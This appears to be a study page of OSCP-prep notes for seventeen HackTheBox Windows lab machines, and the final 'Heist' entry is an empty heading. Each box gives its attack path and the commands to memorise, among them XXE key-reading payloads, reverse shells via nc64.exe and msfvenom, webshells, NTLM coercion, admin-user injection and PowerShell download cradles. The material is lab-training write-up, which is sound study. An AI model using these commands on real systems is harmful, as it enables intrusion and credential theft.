+++
title = 'HTB Windows Machines — OSCP Edge Cases'
date = 2026-10-30
type = 'notes'
weight = 60
toc = true
tags = ['oscp', 'methodology', 'htb', 'windows', 'writeups']
+++

> Eighteen standalone Windows boxes from the OSCP-like list — one intended path each, the non-obvious step that decides it, and the exact command worth memorising. **These are edge-case notes, not walkthroughs**: every IP, hostname, port, user and payload path must be adapted to the target, and the linked writeup remains the walkthrough of record.
>
> **Verification status (2026-10-28):** every CVE and technique below was checked against NVD/MITRE, the vendor advisory, and at least one independent write-up. **Two factual errors** in earlier drafts were corrected — a misattributed **CVE-2019-0708 (BlueKeep) reference** in the RDP notes and the **CVE-2020-0796 (SMBGhost) version range** in the SMB notes. A third item — the **Mailing "which process opens the document"** step — remains marked **(unverified)** because the source does not state it. See [Corrections](#corrections).

Companion pages: [Command Checklist](/notes/oscp-labs/commands/) · [Pattern Library](/notes/oscp-labs/patterns/) · [Methodology](/notes/oscp-labs/methodology/) · [Machine Index](/notes/oscp-labs/machine-index/).

## How to use this page

* **Full port scan, then UDP.** `nmap -sT -p- --min-rate 5000 --max-retries 1` is the baseline; several boxes answer on nothing in the top 1000 (Chatterbox, Arctic) and services hide on UDP (AChat on 9256).
* **Enumerate SMB and RPC before attacking.** Null sessions, share listings (`smbclient -N -L //IP` when `smbmap` fails), and RID cycling (`lookupsids`, 1000–1050) often produce the userlist no wordlist would give you.
* **Re-try every credential** against SMB, WinRM, RDP, MSSQL and the application itself — including username-format variants (`admin` vs `admin@domain`, `user` vs `DOMAIN\user`). Then run `whoami /priv`, check service ACLs and writable service paths before any kernel exploit.
* **Assume Defender and AppLocker.** Prefer living-off-the-land, `shell_exec` over `system`, staged and encoded payloads; a payload that does nothing is usually AV or .NET-version mismatch, not a broken exploit.

***

## Markup

**Path:** Default creds on the MegaShopping login → Order page posts raw XML to `/process.php` → XXE reads Daniel's `id_rsa` → SSH → users-writable `job.bat` run by a SYSTEM schedule.

**Edge cases:**

* 22/tcp is **OpenSSH for Windows**: a Windows host with SSH means "file-read primitive → hunt `C:\Users\<u>\.ssh\id_rsa`", not web RCE. The username is leaked by an HTML source comment ("Modified by Daniel") — read page source before fuzzing users.
* XXE must land in a field that is **echoed back** (`<item>`) with `Content-Type: text/xml` kept; the same request on 443 only answers "Bad request!". Login accepts trivia (`admin:password` was enough), so try defaults before injecting.
* `C:\Log-Management\job.bat` is `BUILTIN\Users:(F)` and re-runs as SYSTEM, but it is **overwritten each run** — the injected line disappears, which looks like "the exploit didn't work".
* Echoing the payload from **PowerShell** mangles the `.bat` (redirect/wildcard errors on `-e`); drop to `cmd.exe` and it fires in seconds.

**Commands to remember:**

```powershell
# Burp Repeater body, POST to /process.php with Content-Type: text/xml
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY t SYSTEM 'file:///c:/users/daniel/.ssh/id_rsa'>]><order><quantity>3</quantity><item>&t;</item><address>x</address></order>
chmod 400 id_rsa; ssh -i id_rsa daniel@IP
icacls C:\Log-Management\job.bat
cmd /c echo C:\Users\Daniel\nc64.exe -e cmd.exe IP 443 > C:\Log-Management\job.bat
```

**Notes:** [XXE](/notes/web-applications/web-attacks/xml-external-entities-xxe/) · [File system ACLs](/notes/windows-privilege-escalation/file-system-acls/) · Writeup: [source](https://infinit3i.com/posts/Markup/) · [alt](https://haxez.org/hack-the-box-markup/)

## Jerry

**Path:** Tomcat 7.0.88 manager with default `tomcat:s3cret` → deploy a malicious WAR → JSP executes as SYSTEM.

**Edge cases:**

* There is **no user→root split**: both flags live in one file (`2 for the price of 1.txt`) on Administrator's Desktop, so don't hunt for a second path.
* `msfvenom -f war` names the JSP randomly — `jar tf` the WAR to learn the name before you can trigger it. The URL is `/<war-name>/<jsp-name>`; the manager UI ("WAR file to deploy") works just as well, and clicking the app entry reveals the JSP.
* Tomcat runs as SYSTEM, so the WAR **is** the privesc; no local enumeration needed.

**Commands to remember:**

```powershell
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=443 -f war > r.war
jar tf r.war
curl http://IP:8080/r/<random>.jsp
# creds: tomcat:s3cret
```

**Notes:** [Tomcat](/notes/web-applications/web-technologies/tomcat/) · Writeup: [source](https://0xdf.gitlab.io/2018/11/17/htb-jerry.html)

## Netmon

**Path:** Anonymous FTP exposes the whole `C:\` → PRTG config backups hold an old plaintext password → year-bumped → PRTG notification command injection → add local admin → psexec.

**Edge cases:**

* The FTP root **is `C:\`** (`cd users\public` for `user.txt`), so anonymous FTP is already game over; don't linger on port 80.
* Live `.dat`/`.old` configs show `<dbpassword><encrypted/>`; only `PRTG Configuration.old.bak` has a plaintext value in an XML comment. **Try the year+1 guess** on old creds (`PrTg@dmin2018` → `2019`) instead of assuming they're dead.
* Injection lives in the **Parameter** field of a notification using a *demo* `.ps1` ("Execute Program"), and only a filtered subset of characters survives — chaining with `;` works. You must **trigger** the notification (checkbox + bell/test icon) for it to run; creating it does nothing.

**Commands to remember:**

```powershell
wget -r ftp://anonymous:@IP
grep -A2 '<dbpassword>' "PRTG Configuration.old.bak"
# Notification parameter:
test.txt;net user anon p3nT3st! /add;net localgroup administrators anon /add
smbmap -H IP -u anon -p 'p3nT3st!' ; psexec.py 'anon:p3nT3st!@IP'
```

**Notes:** [FTP](/notes/protocols-and-services/ftp/) · [OS command injection](/notes/web-applications/web-attacks/os-command-injection/) · Writeup: [source](https://0xdf.gitlab.io/2019/06/29/htb-netmon.html)

## Servmon

**Path:** Anonymous FTP notes → NVMS-1000 path traversal reads `passwords.txt` → password spray → SSH as nadine → NSClient++ 0.5.2.35 privesc → SYSTEM.

**Edge cases:**

* Web fuzzing **breaks** on this appliance: every path returns HTTP 200 with a 118-byte `<response><status>fail</status>`, so gobuster aborts on the wildcard and wfuzz must filter `--hh 118`. A wfuzz run also died at ~2.4k requests with "connection refused" (cause not established) — resume with fewer threads rather than concluding the app is gone.
* Traversal is unusually deep and needs no encoding tricks: `/../../../../../../../../../../../../users/nathan/desktop/passwords.txt`. The file holds **passwords only** — build the userlist from FTP directory names (nathan, nadine) and spray; only one pair hits.
* The NSClient++ password comes from the binary, not a file: `nscp web -- password --display`. `nsclient.ini` sets `allowed hosts = 127.0.0.1`, so the 8443 UI is unreachable without `ssh -L 8443:127.0.0.1:8443`.
* The NSClient++ web UI is genuinely flaky (Chromium worked, Firefox didn't): add an external script, then a 10s schedule, then **Control → Reload** and wait — it is slower than it looks.

**Commands to remember:**

```powershell
wfuzz -c -u http://IP/FUZZ -w list --hh 118
crackmapexec smb IP -u users -p passwords
sshpass -p '...' ssh nadine@IP -L 8443:127.0.0.1:8443
cd "C:\Program Files\NSClient++"; nscp web -- password --display
```

**Notes:** [FTP](/notes/protocols-and-services/ftp/) · [Enumerating attack vectors](/notes/windows-privilege-escalation/enumerating-attack-vectors/) · Writeup: [source](https://0xdf.gitlab.io/2020/06/20/htb-servmon.html)

## Chatterbox

**Path:** Only 9255/9256 (AChat) respond → SEH buffer overflow on 9256/UDP → migrate off the dying process → Alfred → root flag via `icacls`.

**Edge cases:**

* The **top-1000 scan is empty (all filtered)**; you must run a full `-p-` TCP scan with a high `--min-rate`, and remember AChat also listens on **UDP 9256** (nmap reports only TCP).
* The exploit **kills AChat.exe**, so every session dies instantly — the trick is a Metasploit `AutoRunScript` that migrates out of AChat to `notepad.exe` before you interact.
* The msfvenom payload needs `-e x86/unicode_mixed`, `BufferRegister=EAX`, and the huge `-b` bad-char list from the POC; the stock Metasploit module fails ("No encoders encoded the buffer") — use the exploit-db Python POC.
* Root **without** SYSTEM: Alfred has inherited Full Control on Administrator's Desktop but `root.txt` itself is Administrator-only, so re-ACL the file and read it.

**Commands to remember:**

```powershell
nmap -sT -p- --min-rate 5000 --max-retries 1 IP
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=IP LPORT=443 -e x86/unicode_mixed -b '\x00...\xff' BufferRegister=EAX -f python
set AutoRunScript multi_console_command -r automigrate.rc
icacls Desktop ; icacls root.txt /grant alfred:F
```

**Notes:** [File system ACLs](/notes/windows-privilege-escalation/file-system-acls/) · Writeup: [source](https://0xdf.gitlab.io/2018/06/18/htb-chatterbox.html)

## Jeeves

**Path:** Jetty on 50000 → `/askjeeves` Jenkins with **no auth** → job or script-console shell as kohsuke → KeePass `CEH.kdbx` → pass-the-hash Administrator → ADS root flag.

**Edge cases:**

* **Wordlist matters**: feroxbuster's raft-medium finds nothing on 50000, but `gobuster -u http://IP:50000/ -w .../directory-list-2.3-medium.txt -x txt,php,html` finds `/askjeeves` (302). On old boxes, run a second, older list before moving on.
* No `nc` for exfil: copy `CEH.kdbx` into the Jenkins job workspace and download it through the Jenkins UI, then delete it.
* KeePass entry "Backup stuff" is an **LM:NT hash pair**, not a password — `crackmapexec -H` gives `(Pwn3d!)`, then `psexec.py -hashes`. The LM half is the empty-password constant `aad3b435...`.
* `hm.txt` says "look deeper": the flag is an **alternate data stream** — `dir /R` shows `hm.txt:root.txt:$DATA`, read with `more < hm.txt:root.txt`.

**Commands to remember:**

```powershell
println "cmd.exe /c whoami".execute().text
keepass2john CEH.kdbx > h; hashcat h rockyou.txt --user
crackmapexec smb IP -u Administrator -H <LM:NT>
dir /R ; more < hm.txt:root.txt
```

**Notes:** [Jenkins](/notes/web-applications/web-technologies/jenkins/) · [Living off the land](/notes/windows-privilege-escalation/living-off-the-land/) · Writeup: [source](https://0xdf.gitlab.io/2022/04/14/htb-jeeves.html)

## Sniper

**Path:** `/blog?lang=` LFI/RFI → poison the PHP session file in `C:\Windows\Temp` → webshell → `db.php` creds reused for Chris → weaponized `.chm` opened by admin → SYSTEM.

**Edge cases:**

* LFI only works with an **absolute** Windows path (`\windows\win.ini`); `..\` relative paths fail. RFI over SMB needs **real Samba** (`guest ok = yes`, `force user`) — impacket `smbserver.py` gets `STATUS_ACCESS_DENIED` because PHP's SMB client can't authenticate.
* Registration strips `- $ [ ( _ . ; & " \` and the backtick — bypass with backticks and padding: ``a <?php echo `whoami` ?> b``. Session file = `C:\windows\temp\sess_<PHPSESSID>` (grab the cookie from Burp). Reading filtered source: `.` is stripped, so use wildcards (`registration*php`); since `-` is banned, PowerShell base64 must be invoked as **`/enc`**, not `-enc`.
* `user\db.php` credentials are **reused for the OS account Chris** (Remote Management Users) → `Invoke-Command -Credential`. Pivot to Chris before looking for local privesc.
* Root: nishang `Out-CHM` (needs HTML Help Workshop) dropped into `C:\Docs`, where the CEO note says documentation goes; AppLocker means the payload binary must sit in an allowed dir such as `C:\Windows\System32\spool\drivers\color`.

**Commands to remember:**

```powershell
curl -s -G 'http://IP/blog/' --data-urlencode 'lang=\windows\win.ini'
curl -s -G 'http://IP/blog/' --data-urlencode 'lang=\\IP\share\cmd.php' --data-urlencode 'cmd=whoami'
echo 'cmd /c "\\IP\share\nc64.exe -e cmd IP 443"' | iconv -f ascii -t utf-16le | base64 -w0   # then powershell /enc ...
Out-CHM -Payload "...\color\nc64.exe -e cmd IP 443" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
```

**Notes:** [LFI](/notes/web-applications/web-attacks/local-file-inclusion-lfi/) · [RFI](/notes/web-applications/web-attacks/remote-file-inclusion-rfi/) · [Living off the land](/notes/windows-privilege-escalation/living-off-the-land/) · Writeup: [source](https://0xdf.gitlab.io/2020/03/28/htb-sniper.html)

## Querier

**Path:** Null SMB session → `Reports` share `.xlsm` macros leak MSSQL creds → `mssqlclient` → `xp_dirtree` coerces Net-NTLMv2 → crack → `mssql-svc` → `xp_cmdshell` → PowerUp finds a GPP `cpassword` → wmiexec Administrator.

**Edge cases:**

* `smbmap` fails but **`smbclient -N -L`** lists shares — try both before declaring SMB closed. Creds are inside VBA: `olevba` prints the `ADODB.Connection` string (`Uid=reporting;Pwd=...`) in plaintext.
* `mssqlclient.py` needs **`-windows-auth`**; the low-priv `reporting` login cannot `xp_cmdshell` but *can* `xp_dirtree`, which is enough to coerce authentication. Crack with `hashcat -m 5600`, then `enable_xp_cmdshell`.
* Windows refuses to run a `.ps1` straight off a UNC share ("issues loading PowerShell scripts off file shares") — `xcopy` PowerUp to `%TEMP%` and dot-source it locally.
* PowerUp's GPP hit (`Groups.xml`, `cpassword`, user Administrator) is the fast win. **JuicyPotato is dead on Server 2019** even with SeImpersonate, and the `%PATH%` DLL hijack + UsoSvc paths are real findings but dead ends here.

**Commands to remember:**

```powershell
smbclient -N -L //IP ; smbclient -N //IP/Reports
olevba "Currency Volume Report.xlsm"
mssqlclient.py reporting:'Pwd'@IP -windows-auth   # xp_dirtree '\\IP\a'; + responder -I tun0 → hashcat -m 5600
Invoke-AllChecks   # GPP cpassword → wmiexec.py 'administrator:pass@IP'
```

**Notes:** [MSSQL](/notes/protocols-and-services/mssql/) · [SMB](/notes/protocols-and-services/smb/) · Writeup: [source](https://0xdf.gitlab.io/2019/06/22/htb-querier.html)

## Giddy

**Path:** `/mvc` SQL injection → stacked `xp_dirtree` → Net-NTLMv2 for Stacy → crack → WinRM → UniFi Video `taskkill.exe` hijack → SYSTEM.

**Edge cases:**

* 80 and 443 serve the same app; `/remote` is **PowerShell Web Access** (a hint that WinRM is the intended shell), not an entry point. Stacked queries are enabled, so injection alone yields NTLM coercion: `8; EXEC master..xp_dirtree "\\IP\test"; --` (or `sqlmap -r product.request --dbms mssql --risk 3 --level 5 --batch --dbs`). Capture with responder *or* impacket smbserver — the share name must match the UNC.
* As an unprivileged user **all service enumeration is denied** (`sc query`, `net start`, `Get-WmiObject Win32_Service`) — read `HKLM:\SYSTEM\CurrentControlSet\Services` in the registry instead, and check PSReadLine `ConsoleHost_history.txt`, which literally contains the `net stop unifivideoservice` commands.
* UniFi Video runs `C:\ProgramData\unifi-video\taskkill.exe` on start **and stop**, and that file does not exist → drop the payload there, then `Stop-Service` → SYSTEM.
* Defender blocks a raw msfvenom exe and AppLocker blocks exes outside allowed paths (`C:\Windows\tasks` works); Ebowla (env-keyed, e.g. computername `Giddy`) gets past both.

**Commands to remember:**

```powershell
Product.aspx?ProductSubCategoryId=8;%20EXEC%20master..xp_dirtree%20"\\IP\test";%20--
cd HKLM:\system\currentcontrolset\services; ls   # then cat ...\PSReadline\ConsoleHost_history.txt
python ebowla.py rev.exe genetic.config; ./build_x64_go.sh ...
Stop-Service -Name Unifivideoservice -Force
```

**Notes:** [Enumerating attack vectors](/notes/windows-privilege-escalation/enumerating-attack-vectors/) · [MSSQL](/notes/protocols-and-services/mssql/) · Writeup: [source](https://0xdf.gitlab.io/2019/02/16/htb-giddy.html)

## Bounty

**Path:** IIS 7.5 upload form → extension filter bypass (null byte) → `.aspx` won't execute → upload a **`web.config`** that maps `*.config` to `asp.dll` → RCE as merlin → SeImpersonate → SYSTEM.

**Edge cases:**

* Uploading `cmdasp.aspx` passes the filter but returns a 500: the handler isn't mapped. The fix is to upload a **`web.config`** with a `handlers` entry (`scriptProcessor=...\asp.dll`) plus `requestFiltering` removals, then request `/UploadedFiles/web.config` — the ASP appended after `</configuration>` executes.
* Filter bypass is a **null byte in the filename** so the check sees `.jpg` while the file lands as `.aspx`. `UploadedFiles` is **wiped every few minutes** — don't invest in a persisted webshell, go straight to a reverse shell.
* `user.txt` is hidden: plain `ls` shows nothing → `gci -force`.
* `SeImpersonatePrivilege` is already enabled → **LonelyPotato** works on 2008 R2, and with no hotfixes MS10-092 (schelevator) / MS16-014 also fire. Watson/Sherlock are **.NET-version sensitive**: build for the target's framework (2.0.50727) or the exe returns nothing at all and looks "broken".

**Commands to remember:**

```powershell
/UploadedFiles/cmdasp.aspx?cmd=whoami
# web.config: <handlers accessPolicy="Read, Script, Write"> + <add path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64"/> + <remove fileExtension=".config"/> + <remove segment="web.config"/>
whoami /priv   # SeImpersonatePrivilege → lp.exe * rev.bat
msbuild -version   # in C:\windows\microsoft.net\framework\v2.0.50727
```

**Notes:** [Microsoft IIS](/notes/web-applications/web-technologies/microsoft-iis/) · [File uploads](/notes/web-applications/web-attacks/file-uploads/) · [Excessive user rights](/notes/windows-privilege-escalation/excessive-user-rights-abuse/) · Writeup: [source](https://0xdf.gitlab.io/2018/10/27/htb-bounty.html)

## Arctic

**Path:** ColdFusion 8 on TCP 8500 → unauthenticated FCKeditor file upload → JSP reverse shell as `tolis` → unpatched Server 2008 R2 → MS10-059 → SYSTEM.

**Edge cases:**

* `nmap -sV` labels 8500 `fmtp?` and gives nothing; a raw `nc` + `GET / HTTP` returns `Server: JRun Web Server` and a directory listing of `CFIDE/` and `cfdocs/` — that banner is the whole identification step. Every request then takes ~30 s, and firing many tabs at once yields empty responses: single-threaded with long timeouts.
* Upload bypass needs three things at the same time: multipart filename ending `.txt` (a `.jsp` filename is filtered), `Content-Type: application/x-java-archive`, and `CurrentFolder=/<name>.jsp%00` so the null byte truncates the created folder name.
* `password.properties` (SHA1) is readable via `enter.cfm?locale=../../…/ColdFusion8/lib/password.properties%00en`; you do not have to crack it — the form posts `hex_hmac_sha1(salt, hex_sha1(password))`, so compute `hex_hmac_sha1(document.loginform.salt.value, '<leaked-sha1>')` and submit. The salt rotates every ~30 s, so re-fetch the form and submit immediately.
* Privesc: `systeminfo` shows `Hotfix(s): N/A` → Windows-Exploit-Suggester. Pick an exploit that takes LHOST/LPORT (Chimichurri, MS10-059); exploits that only spawn a local `cmd.exe` as SYSTEM are useless from a remote shell. The upload module is `cfm/webapps/16788.rb` (`searchsploit -x cfm/webapps/16788.rb`).

**Commands to remember:**

```powershell
nc IP 8500   # GET / HTTP → Server: JRun Web Server
curl -X POST -F "newfile=@shell.jsp;type=application/x-java-archive;filename=shell.txt" 'http://IP:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/df.jsp%00'
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=443 -f raw > shell.jsp
windows-exploit-suggester.py --update   # needs pip install xlrd; then --database ... --systeminfo sysinfo
```

**Notes:** [File uploads](/notes/web-applications/web-attacks/file-uploads/) · [Enumerating attack vectors](/notes/windows-privilege-escalation/enumerating-attack-vectors/) · Writeup: [source](https://0xdf.gitlab.io/2020/05/19/htb-arctic.html)

## Remote

**Path:** NFS export `/site_backups` → `App_Data/Umbraco.sdf` → crack admin SHA1 → Umbraco authenticated XSLT RCE → IIS AppPool → TeamViewer 7 `SecurityPasswordAES` → admin password reuse.

**Edge cases:**

* NFS on a Windows host is the foothold: `showmount -e` then `mount -t nfs` gives a live copy of the webroot, so you can read `Web.config` and the SQL CE database without touching HTTP.
* `strings Umbraco.sdf` alone leaks usernames, the SHA1 admin hash **and** the `{"hashAlgorithm":"SHA1"}` marker; `smith`/`ssmith` use a salted `HMACSHA256` scheme and are not worth cracking early. Umbraco's login is the **email** `admin@htb.local` — `admin` fails; `hashcat -m 100` for the SHA1.
* The public Umbraco RCE script needs `host = "http://10.10.10.180"` (scheme included) or it errors; edit the C# block to run `cmd.exe /c` and test with a ping before the PowerShell `iex(new-object net.webclient).downloadstring(...)` loader. `user.txt` sits in `C:\Users\Public`, because the only shell is `iis apppool\defaultapppool` and there is no human user profile.
* Privesc: `tasklist` shows `TeamViewer_Service.exe`; read `HKLM:\software\wow6432node\teamviewer\version7`, take `SecurityPasswordAES`, AES-128-CBC decrypt with the static key/IV from the Metasploit `teamviewer_passwords` module, and decode UTF-16LE (`AES.new(key, AES.MODE_CBC, IV=iv).decrypt(ct).decode("utf-16").rstrip("\x00")`). The result is the local administrator password.

**Commands to remember:**

```powershell
showmount -e IP ; mount -t nfs IP:/site_backups /mnt
strings /mnt/App_Data/Umbraco.sdf | head
hashcat -m 100 admin.sha1 rockyou.txt
netexec smb IP -u administrator -p '<pass>'   # (Pwn3d!) → evil-winrm -u administrator -p '<pass>' -i IP
```

**Notes:** [NFS](/notes/protocols-and-services/nfs/) · Writeup: [source](https://0xdf.gitlab.io/2020/09/05/htb-remote.html)

## Buff

**Path:** Gym Management System 1.0 unauthenticated upload → PHP webshell as `shaun` → localhost CloudMe 1.11.2 stack overflow tunnelled with Chisel → SYSTEM.

**Edge cases:**

* The enormous gobuster output is a rabbit hole; identify the product from the site footer / `/contact.php`, or `README.md` at the web root, then `searchsploit gym management` (EDB 48506).
* Upload needs all filters beaten at once: `id=` sets the output filename, `pupload=upload` satisfies the handler, double extension `.php.png` passes the `end(explode('.'))` whitelist, `Content-Type: image/png` passes the MIME check, and the PHP file must *start* with the PNG magic bytes.
* Inside the webshell, `system()` gets the payload eaten by Defender on upload; `<?php echo shell_exec($_REQUEST["cmd"]); ?>` works. The shell is stateless (no `cd`), so use absolute paths like `type \users\shaun\desktop\user.txt`.
* Privesc discovery: `netstat -ano | findstr :0` shows `127.0.0.1:8888`, and the PID changes every minute — `tasklist /v | findstr <pid>` fast, or just notice `CloudMe_1112.exe` in `C:\Users\shaun\Downloads`. 8888 is localhost-only → Chisel reverse (`R:8888:localhost:8888`), then run the BOF against `127.0.0.1:8888`. Payload is 32-bit: `msfvenom -a x86 -b '\x00\x0A\x0D' -f python -v payload`.

**Commands to remember:**

```powershell
curl -X POST 'http://IP:8080/upload.php?id=0xdf' -F 'pupload=upload' -F 'file=@shell.php.png'
printf '\x89PNG\r\n\x1a\n<?php echo shell_exec($_REQUEST["cmd"]); ?>' > shell.php.png
chisel server -p 8000 --reverse   # target: .\c.exe client IP:8000 R:8888:localhost:8888
searchsploit -m windows/remote/48389.py   # EIP 0x68A842B5 PUSH ESP/RET, 1052-byte offset
```

**Notes:** [File uploads](/notes/web-applications/web-attacks/file-uploads/) · [Pivoting and tunnelling](/notes/utilities-scripts-and-payloads/pivoting-tunneling-port-forwarding/) · Writeup: [source](https://0xdf.gitlab.io/2020/11/21/htb-buff.html)

## Love

**Path:** TLS cert leaks `staging.love.htb` → `/beta.php` URL fetcher = SSRF → credentials on internal `127.0.0.1:5000` → Voting System authenticated upload RCE as `phoebe` → AlwaysInstallElevated → SYSTEM.

**Edge cases:**

* When 443 only returns 403, read the certificate: it carries `love.htb` **and** `staging.love.htb`, which is the entire vhost discovery step (no ffuf needed). `staging`'s "Demo" page (`/beta.php`) fetches an arbitrary URL; `http://127.0.0.1:5000` returns an internal page that prints the voting-system credentials — SSRF used as a credential leak, not just port knocking.
* EDB 49445 hardcodes `/votingsystem/` in every URL; delete that segment or all three requests 404. Add `s.proxies = {'http': 'http://127.0.0.1:8080'}` to the script's `requests.Session` to see why it fails.
* Manual equivalent: log in, click the admin's name → profile update → the profile picture accepts a bare `<?php system($_REQUEST["cmd"]); ?>` as `cmd.php`, served from `/images/cmd.php`. No filter — try the obvious before building a bypass.
* Privesc: winPEAS prints both `AlwaysInstallElevated` keys and a PSReadLine history path; the flag is valid only when **HKLM *and* HKCU** are 1. Note `C:\` grants Authenticated Users CreateDirectories, which makes staging easy.

**Commands to remember:**

```powershell
openssl s_client -connect IP:443   # → add love.htb + staging.love.htb to /etc/hosts
python3 49445.py   # after removing /votingsystem from every URL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f msi -o rev.msi
msiexec /quiet /qn /i rev.msi   # after reg query HKCU\...\Installer /v AlwaysInstallElevated (and HKLM) → 1
```

**Notes:** [SSRF](/notes/web-applications/web-attacks/ssrf/) · [Enumerating attack vectors](/notes/windows-privilege-escalation/enumerating-attack-vectors/) · Writeup: [source](https://0xdf.gitlab.io/2021/08/07/htb-love.html) · [alt](https://raw.githubusercontent.com/armourinfosec/Offensive-Windows-Privilege-Escalation/refs/heads/main/Registry-Exploitation/AlwaysInstallElevated-Exploitation.md)

## Secnotes

**Path:** Contact-form bot → XSRF password reset of `tyler` (or accidental second-order SQLi) → SMB-writable `new-site` → webshell on 8808 → WSL `.bash_history` leaks admin password → `winexe`.

**Edge cases:**

* Two independent ways to `tyler`: the intended XSRF (`change_pass.php` accepts **GET** and never asks for the current password, so a link in a contact message resets his password when the bot clicks), and an accidental second-order SQLi — register as `' or 1='1`, then log in and `home.php` prints every user's notes.
* 8808 is the same directory as the `new-site` SMB share, so `smbclient put` + `curl` = code execution. The share/webroot is wiped on a timer, so script the upload-and-trigger instead of hand-crafting it twice.
* Enumerate WSL as a *credential store*, not a privilege boundary: `bash.exe` lives under `C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_*`, and `root`'s `.bash_history` (also readable via `C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_*\LocalState\rootfs\root`) contains the `smbclient -U 'administrator%…' \\127.0.0.1\c$` line — `where /R c:\ bash.exe`, then `cat .bash_history`.
* A WSL uid-0 shell is *not* Windows admin — it is sandboxed to tyler's access. Use the recovered password with `net use \\127.0.0.1\c$ /user:administrator`, or `winexe`/`psexec.py` from Kali.

**Commands to remember:**

```powershell
curl 'http://IP/change_pass.php?password=x&confirm_password=x&submit=submit'   # inside a contact message
smbclient -U 'tyler%<pass>' //IP/new-site -c 'put cmd.php 0xdf.php'
curl 'http://IP:8808/0xdf.php?cmd=nc.exe+-e+cmd.exe+IP+443'
net use \\127.0.0.1\c$ /user:administrator "<pass>" ; type \\127.0.0.1\c$\users\administrator\desktop\root.txt
```

**Notes:** [CSRF](/notes/web-applications/web-attacks/csrf/) · [Enumerating attack vectors](/notes/windows-privilege-escalation/enumerating-attack-vectors/) · Writeup: [source](https://0xdf.gitlab.io/2019/01/19/htb-secnotes.html)

## Access

**Path:** Anonymous FTP → `backup.mdb` + AES zip → `Access Control.pst` → `security` telnet shell → `cmdkey` stored admin creds → `runas /savecred` (or DPAPI decrypt) → administrator.

**Edge cases:**

* One directory holds two credential stores: `Backups/backup.mdb` and `Engineer/Access Control.zip`. `unzip` fails with "unsupported compression method 99" (AES) — use `7z x`, and take the password from the mdb, not from a wordlist. FTP gotchas: `bin` before `get`; quote names with spaces (`get "Access Control.zip"`); `get Acc*` returns 550.
* mdbtools on a 100+ table Access DB: `mdb-tables`, then loop `mdb-export <db> <table> | wc -l` to find the handful of non-empty tables; `auth_user` holds cleartext `username,password`, including a non-admin password that opens the zip.
* `readpst` the `.pst` to mbox, then `mutt -Rf` (read-only) to read it; the mail contains the rotated `security` password, and the open telnet service is the shell.
* Privesc: `cmdkey /list` shows `Domain:interactive=ACCESS\Administrator`, and `C:\Users\Public\Desktop\*.lnk` (readable with `type`) contains `runas /user:ACCESS\Administrator /savecred`. `runas` opens a **new window**, so you cannot see output — make it run a reverse shell. Offline alternative: exfil `%APPDATA%\Microsoft\Protect\<SID>\*` + `%APPDATA%\Microsoft\Credentials\*` with `certutil -encode`, then `dpapi::masterkey /sid:… /password:<security pw>` and `dpapi::cred`.

**Commands to remember:**

```powershell
ftp IP   # anonymous → bin → get "Access Control.zip"
for t in $(mdb-tables backup.mdb); do ...; done ; mdb-export backup.mdb auth_user
7z x "Access Control.zip" ; readpst "Access Control.pst" ; mutt -Rf "Access Control.mbox"
runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://IP/shell.ps1')"
```

**Notes:** [FTP](/notes/protocols-and-services/ftp/) · [Enumerating attack vectors](/notes/windows-privilege-escalation/enumerating-attack-vectors/) · Writeup: [source](https://0xdf.gitlab.io/2019/03/02/htb-access.html)

## Mailing

**Path:** `download.php?file=` path traversal → `hMailServer.ini` MD5 → SMTP auth → CVE-2024-21413 phish of `maya` → NetNTLMv2 crack → WinRM → LibreOffice 7.4.0.1 CVE-2023-2255 → `localadmin`.

**Edge cases:**

* The file read is `file_get_contents('C:/wwwroot/instructions/' . $file)` — not an include (it was `include()` at release, the patched unintended path). Both `/` and `\\` separators work, and `+` encodes the space in `Program+Files+(x86)`. `hMailServer.ini` lives in `C:\Program Files (x86)\hMailServer\bin\` and yields two MD5s; the admin hash is the **mail** admin password, not the Windows one. SMTP auth requires the full UPN — `administrator` fails, `administrator@mailing.htb` succeeds — and `swaks --auth-user … --quit-after AUTH` validates it without sending mail.
* **CVE-2024-21413** ("MonikerLink") is an Outlook RCE and credential-leak flaw with a CVSS of **9.8**, disclosed 13 February 2024. It must go out on **587** (STARTTLS); the PoC errors on 25 with "STARTTLS extension not supported". The body link is `file:///\\IP\share\sploit!poc` — the `!anything` suffix is what suppresses the protocol security prompt. Catch the auth with Responder `-I tun0`, crack as Net-NTLMv2 (`hashcat` auto-detects 5600).
* Patched-unintended path: SMTP log poisoning (`HELO <?php system($_REQUEST['cmd']); ?>`) read back through the same LFI at `../../progra~2/hmailserver/logs/hmailserver_<date>.log` (8.3 name!) → `defaultapppool` → `whoami /priv` shows `SeImpersonatePrivilege` → GodPotato.
* Intended root: the `Important Documents` share reports READ but is writable (netexec bug) and its contents are consumed by a scheduled job within minutes, so dropping the `.odt` there gets it opened; installed LibreOffice 7.4.0.1 is **CVE-2023-2255** — a flaw where **"floating frames" linked to external files load their contents without prompting the user**, which can lead to arbitrary code execution when a malformed document is opened → shell as `localadmin`. (Which process opens the document is not stated in the writeup — **(unverified)**.)

**Commands to remember:**

```powershell
curl 'http://mailing.htb/download.php?file=../../Program+Files+(x86)/hMailServer/bin/hMailServer.ini'
swaks --auth-user 'administrator@mailing.htb' --auth LOGIN --auth-password '<pw>' --quit-after AUTH --server mailing.htb
python CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password '<pw>' --recipient maya@mailing.htb --url "\\IP\share\sploit"
python CVE-2023-2255.py --cmd 'cmd.exe /c C:\ProgramData\nc64.exe -e cmd.exe IP 443' --output exploit.odt
```

**Notes:** [SMTP](/notes/protocols-and-services/smtp/) · [Excessive user rights](/notes/windows-privilege-escalation/excessive-user-rights-abuse/) · Writeup: [source](https://0xdf.gitlab.io/2024/09/07/htb-mailing.html)

## Heist

